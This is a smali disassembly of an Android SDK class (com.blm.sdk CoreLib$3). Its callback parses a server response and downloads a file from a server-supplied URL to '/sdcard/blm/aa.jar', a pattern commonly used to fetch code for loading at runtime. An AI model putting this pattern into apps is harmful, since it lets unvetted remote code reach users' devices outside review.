.class final Lcom/blm/sdk/core/CoreLib$3;
.super Ljava/lang/Object;
.source "SourceFile"

# interfaces
.implements Lcom/blm/sdk/c/a;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/blm/sdk/core/CoreLib;->init(Landroid/content/Context;Ljava/lang/String;)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x8
    name = null
.end annotation


# instance fields
.field final synthetic a:Landroid/content/Context;


# direct methods
.method constructor <init>(Landroid/content/Context;)V
    .locals 0

    .prologue
    .line 85
    iput-object p1, p0, Lcom/blm/sdk/core/CoreLib$3;->a:Landroid/content/Context;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public a(Ljava/lang/String;I)V
    .locals 7

    .prologue
    const/4 v3, 0x0

    .line 89
    invoke-static {p1}, Lcom/blm/sdk/d/f;->c(Ljava/lang/String;)Lcom/blm/sdk/a/c/c;

    move-result-object v0

    .line 91
    if-eqz v0, :cond_0

    .line 94
    :cond_0
    if-eqz v0, :cond_1

    invoke-virtual {v0}, Lcom/blm/sdk/a/c/c;->a()I

    move-result v1

    if-nez v1, :cond_1

    .line 95
    invoke-virtual {v0}, Lcom/blm/sdk/a/c/c;->b()Ljava/util/List;

    move-result-object v0

    .line 96
    if-eqz v0, :cond_1

    invoke-interface {v0}, Ljava/util/List;->size()I

    move-result v1

    if-lez v1, :cond_1

    .line 97
    invoke-interface {v0, v3}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    move-object v6, v0

    check-cast v6, Lcom/blm/sdk/a/a/a;

    .line 98
    if-eqz v6, :cond_1

    .line 99
    invoke-virtual {v6}, Lcom/blm/sdk/a/a/a;->d()Ljava/lang/String;

    move-result-object v0

    const-string v1, "/sdcard/blm/aa.jar"

    const/4 v2, 0x0

    invoke-virtual {v6}, Lcom/blm/sdk/a/a/a;->e()Ljava/lang/String;

    move-result-object v4

    new-instance v5, Lcom/blm/sdk/core/CoreLib$3$1;

    invoke-direct {v5, p0, v6}, Lcom/blm/sdk/core/CoreLib$3$1;-><init>(Lcom/blm/sdk/core/CoreLib$3;Lcom/blm/sdk/a/a/a;)V

    invoke-static/range {v0 .. v5}, Lcom/blm/sdk/http/Cda;->df(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;ILjava/lang/String;Lcom/blm/sdk/down/DownloadListener;)V

    .line 123
    :cond_1
    return-void
.end method

.method public b(Ljava/lang/String;I)V
    .locals 0

    .prologue
    .line 128
    return-void
.end method
